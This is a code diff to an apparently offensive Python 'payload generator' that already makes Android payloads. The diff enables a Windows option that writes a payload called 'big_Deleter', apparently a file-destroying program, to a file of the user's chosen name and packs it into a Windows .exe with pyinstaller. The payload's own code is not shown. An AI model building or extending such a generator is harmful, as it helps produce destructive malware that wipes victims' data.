@@ -1,5 +1,6 @@
 import os
 from androidpayloadengine import androidpayloadengine
+from windowsEngine import WindowsPayloadEngine
 from colorama import Fore,Style
 
 # banner
@@ -23,12 +24,13 @@ def menu():
     print(Fore.GREEN+'[+] * THIS IS BETA VERSION *')
     print(Style.RESET_ALL)
     print('[1] Android little payloads')
-    print('[2] Windows payloads ( Coming Soon ) ')
+    print('[2] Windows payloads')
     choice = input('Enter Your choice : ')
     if choice == '1':
         androidpayloads()
     elif choice == '2':
-        print('[!] Windows payload are not availible yet...')
+        Create_Win_payloadONE()
+        # print('[!] Windows payload are not availible yet...')
         # os.system('clear')
         menu()
     elif choice == '3':
@@ -132,6 +134,29 @@ def Create_payloadFOUR():
     except FileExistsError as e:
         print(e)
 
+def Create_Win_payloadONE():
+    file_name = input('[+] Enter file_name : ')
+    ENGINE = WindowsPayloadEngine()
+    try:
+        with open(file_name+'.py' , 'w') as file:
+            file.write(ENGINE.big_Deleter())
+            file.close()
+            if os.path.isfile(file_name + '.py'):
+                print(Fore.GREEN+f'[+] Successfully Generated : {file_name}.py')
+                try:
+                    os.system(f'pyinstaller {file_name}.py')
+                    print()
+                    print(f'[+] Successfully converted into {file_name}.exe')
+                except:
+                    print()
+                    print(Fore.RED+f'[!] ERROR.. {file_name}.py can\'t be converted to {file_name}.exe')
+                finally:
+                    print(Style.RESET_ALL)
+            else:
+                print(Fore.RED+'[!] Failed!')
+                print(Style.RESET_ALL)
+    except FileExistsError as e:
+        print(e)
 
 
 
